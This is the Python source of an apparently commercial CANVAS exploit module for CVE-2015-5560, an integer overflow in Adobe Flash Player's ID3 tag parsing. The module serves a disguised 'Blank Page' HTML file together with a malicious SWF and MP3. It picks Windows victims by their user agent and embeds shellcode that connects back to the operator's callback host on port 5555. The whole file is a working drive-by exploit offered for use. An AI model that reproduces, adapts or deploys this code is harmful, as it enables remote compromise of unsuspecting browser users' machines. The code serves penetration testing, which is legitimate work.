#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re
import base64
import urllib

from shellcode import shellcodeGenerator

from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_id3'
DESCRIPTION                       = 'Adobe Flash Player ID3 Tag Parsing Integer Overflow'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['References']       = ['https://bugs.chromium.org/p/project-zero/issues/detail?id=443']
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player <= 18.0.0.209 on Windows'
DOCUMENTATION['CVE Name']         = 'CVE-2015-5560'
DOCUMENTATION['CVE Url']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5560'
DOCUMENTATION['Notes']            = """

This module exploits a mishandling of large integers during the decoding of an ID3 tag. 
This situation leads to an integer overflow that eventually could produce a heap overflow.
In this case, an array's length will be corrupted to obtain an arbitrary memory read/write primitive.

Tested on:
- Windows 7 Ultimate SP1 x32 with IE11 32 bits (Adobe Flash Player 18.0.0.209 32-bit)
- Windows 7 Professional SP1 x64 with IE11 32 bits (Adobe Flash Player 18.0.0.209 32-bit)

"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = "%s.swf" % randomstring(8)
        self.mp3filename     = "%s.mp3" % randomstring(8)
        self.swfrealfilename = 'id3'
        self.mp3realfilename = 'id3'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.badstring       = '\x00'

    def createShellcode(self, x64=False):
        if x64:
            p = payloads64.payloads()
            asm = p.InjectToSelf(self.callback.ip, 5555)
            bin = p.assemble(asm)
            self.shellcode = bin
            while len(self.shellcode) % 4 != 0:
                self.shellcode = "\x90" + self.shellcode

        else:
            self.shellcode = self.createWin32ClientSideShellcode()


    def makefile(self):
        """
        Makes the exploit HTML
        """

        filedata="""<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
                <object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" width=600 height=430 VIEWASTEXT>
                    <param name="allowScriptAccess" value="sameDomain" />
                    <param name="movie" value="SWFFILENAME" />
                    <param name=FlashVars value="var1=MP3FILENAME&var2=PAYLOAD" />
                    <embed src="SWFFILENAME" width="550" height="400" name="SWFFILENAME"
                    allowScriptAccess="sameDomain" type="application/x-shockwave-flash"
                    FlashVars = "var1=MP3FILENAME&var2=PAYLOAD"
                    pluginspage="http://www.macromedia.com/go/getflashplayer" />
                </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('MP3FILENAME', self.mp3filename)
        filedata = filedata.replace('PAYLOAD', urllib.quote(base64.b64encode(self.shellcode)))
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swfrealfilename + '.swf'), 'rb') as f:
            return f.read()

    def makeMP3(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.mp3realfilename + '.mp3'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        # if there is no info about plugins, at least we can filter using
        # the user-agent making sure target is Windows
        useragent = clientheader.getStrValue(['User-Agent'])
        if "windows" in useragent.lower():
            self.log_info("This client is likely to be vulnerable")
            if 'win64' in useragent.lower():
                self.createShellcode(True)
            else:
                self.createShellcode(False)
        else:
            self.log_error("Bailing on this client as it is not likely to be vulnerable")
            return None, None

        if self.filename in clientheader.URL:
            self.log_info('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')
        elif self.swffilename in clientheader.URL:
            self.log_info('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type', 'application/x-shockwave-flash')
        elif self.mp3filename in clientheader.URL:
            self.log_info('Serving MP3 file')
            b.setBody(self.makeMP3())
            h.addHeader('Content-Type', 'application/octet-stream')
        else:
            self.log_info('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b


    def run(self):
        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log_info('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.log_info('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
